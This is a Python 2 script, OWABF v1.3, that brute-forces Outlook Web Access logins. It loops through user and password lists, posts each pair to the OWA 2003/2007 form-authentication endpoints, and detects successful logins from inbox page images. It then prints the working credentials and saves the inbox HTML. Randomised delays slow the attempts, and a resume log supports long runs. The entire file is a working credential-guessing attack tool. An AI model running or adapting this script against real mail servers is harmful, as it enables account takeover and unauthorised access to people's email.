#OWAFB  v.1.3
# Dejan Levaja
# dejan.levaja@netsec.rs
# http://www.netsec.rs



# TODO:
# Learn Python :)
# Basic auth
# Better error handling
# Multithreading
# Bound resume option to user/pass combination not to username only
# Automatic OWA version detection
# User Agents







import urllib2, urllib, re, sys, time, random
from optparse import OptionParser, SUPPRESS_USAGE


def error():
	print "\nUsage:"
	print "\n\t\towafb.py [options]"
	print "\t\towafb.py -s https://owa.foo.bar -u userlist -p pwdlist"
	print "\nOptions:\n"
	print "\t-s\tServer FQDN."
	print "\t-u\tUserlist."
	print "\t-p\tPasslist. If omitted, owafb expects separate passlist for every user in userlist."
	print "\t\t i.e. 'owafb.py -u userlist', loops through user list and for user 'foo.bar',"
	print "\t\t expects to find a passlist 'foo.bar' in the working directory."
	print "\t\t This option is best used in conjunction with WMPG password generator."
	print "\t-v\tExchange server version. If omitted, defaults to auto-detection."
	print "\t-l\tLog progress to file."
	print "\t-r\tResume from log file."
	print "\t-t\tTime interval. Random in range specified."
	print "\t-?\tPrints help."
	sys.exit()



		
def userList(userlist):
	userlist=open(userlist,"r")
	return userlist


	
def passList(passlist):
	try:
		passlist=open(passlist,"r")
		return passlist
	except:
		print "\nThere is no",passlist," passlist file"
		sys.exit()
	
	
	
def logToFile(logfile,user,n):
	#log used user names to file
	logfile=open(logfile, "a")
	logfile.write(user)
	logfile.write(n)
	return logfile

def resume(resumefile):
	#read log file and don't use already used user names
	res=open(resumefile,"r")
	resumefile=[]
	for user in res:
		resumefile.append(user.rstrip())
	return resumefile
	

def sleepTime(sleeptime):
	#we don't want do DoS the server logs, right?
	sleeptime=random.randrange(sleeptime)
	return sleeptime

def version(server_version):
	# OWA 2003 or OWA 2007?
		print "\nu verziji: ",server_version
		if server_version==1 or server_version=="":
			version==1
		else:
			version==2
		return version
			
	
def connectOWA2003():
	#Connect to OWA  
	rnd=random.randrange(sleeptime)
	time.sleep(rnd)
	try:
		owa = opener.open(server+'/exchweb/bin/auth/owaauth.dll', params)
		data = owa.read()
		owa.close() 
		if re.search("logon_IE_bot.gif",data):
			print "\tLogin unsuccessful"
		else:
			checkLogin2003()
	except:
		print "\nCannot find server. Check URL and server's FQDN. It should be something like this:"
		print "\thttps://somehost.somedomain.com\n"
		sys.exit()
		
def connectOWA2007():
	#Connect to OWA  
	rnd=random.randrange(sleeptime)
	time.sleep(rnd)
	try:
		owa = opener.open(server+'/owa/auth/owaauth.dll', params) 
		data = owa.read()
		owa.close() 
		if re.search("logon_IE_bot.gif",data):
			print "\tLogin unsuccessful"
		else:
			checkLogin2007()
	except:
		print "\nCannot find server. Check URL and server's FQDN. It should be something like this:"
		print "\thttps://somehost.somedomain.com\n"
		sys.exit()

def checkLogin2003():
	#Let's try to open inbox
	URLinbox=server+'/exchange/'+user+'/Inbox/?Cmd=contents'
	owa = opener.open(URLinbox)
	data = owa.read()
	owa.close() 
	#Check if Login is successful
	if re.search("minus.gif",data):
				u,p,d,f,s,t=params.split("&")
				print "\a\n",u,p,"\n"

def checkLogin2007():
	#Let's try to open inbox
	URLinbox=server+'/owa/?ae=Folder&t=IPF.Note&a='
	owa = opener.open(URLinbox)
	data = owa.read()
	owa.close() 
	#Check if Login is successful
	if re.search("addrbook.gif",data): 
				u,p,d,f,s,t=params.split("&")
				print "\a\n",u,p,"\n"
	writer=open("owalogin.htm","w")
	writer.writelines(data)


#*****************************************************************************************************
#*****************************************************************************************************
#*****************************************************************************************************

# M A I N ( )
opener = urllib2.build_opener(urllib2.HTTPCookieProcessor())
urllib2.install_opener(opener)
start_time=time.time() 
version=1


#*****************************************************************************************************
#Self praise
print "\n"
print "***********************************"
print "***\tOWA Brute Forcer\t***"
print "***\tOWABF v 1.3\t\t***"
print "***\tDejan Levaja\t\t***"
print "***\thttp://www.netsec.rs\t***"
print "***\tdejan.levaja@netsec.rs\t***"
print "***********************************"
print "  Outlook Web Access Brute Forcer\n"




#*****************************************************************************************************
#Parsing args
parser = OptionParser(usage=SUPPRESS_USAGE)
parser.add_option("-s", dest="server")
parser.add_option("-u", dest="userlist")
parser.add_option("-p", dest="passlist")
parser.add_option("-v", dest="serverversion")
parser.add_option("-l", dest="logtofile")
parser.add_option("-r", dest="resume")
parser.add_option("-t", dest="sleeptime")
parser.add_option("-?", action="store_true", dest="err")
(options, args) = parser.parse_args()				  

if len(sys.argv)>=2:
	
	if options.server:
		server=options.server
	else:
		error()
		
	if options.userlist:
		userlist=userList(options.userlist)
	else:
		error()
		
	if options.passlist:
		passlist=options.passlist
	else:
		passlist=""
			
	if options.serverversion:
		if options.serverversion=="1":
			version=1
		elif options.serverversion=="2":
			version=2
		else:
			print "\nUnknown OWA/Exchange version."
			sys.exit()
	if options.logtofile:
		logfile=options.logtofile
	else:
		logfile=""
		
	if options.resume:
		resumefile=resume(options.resume)
	else:
		resumefile=""
		
	if options.sleeptime:
		sleeptime=int(options.sleeptime)+1
	else:
		sleeptime=int(1)
	
else:
	error()
	
	

	
#*****************************************************************************************************


for user in userlist:
	user=user.rstrip()
	if user not in resumefile:
		if logfile:
			logToFile(logfile,user,"\n")
		if passlist=="":	
			pwdlist=passList(user)
		else:
			pwdlist=passList(passlist)

		for password in pwdlist:
			pwd = password.rstrip()
			
			if version==1:
			#POST parameters for OWA Form Based Authentication
				params = urllib.urlencode(dict(
										username=user, 
										password=pwd, 
										destination=server,
										flags='0',
										SubmitCreds ='Log On',
										trusted='0'
										)
								)	
				#Now, let's connect to OWA
				connectOWA2003()
				print user,"\t",pwd
			if version==2:
				#POST parameters for OWA Form Based Authentication
				params = urllib.urlencode(dict(
										username=user, 
										password=pwd, 
										destination=server+'/owa', 
										flags='0',
										SubmitCreds ='Log On',
										trusted='0'
										)
								)	
				#Now, let's connect to OWA
				connectOWA2007()
				print user,"\t",pwd

stop_time=time.time()
sum_time=(stop_time)-(start_time)
print "\nTime elapsed:",sum_time,"seconds"



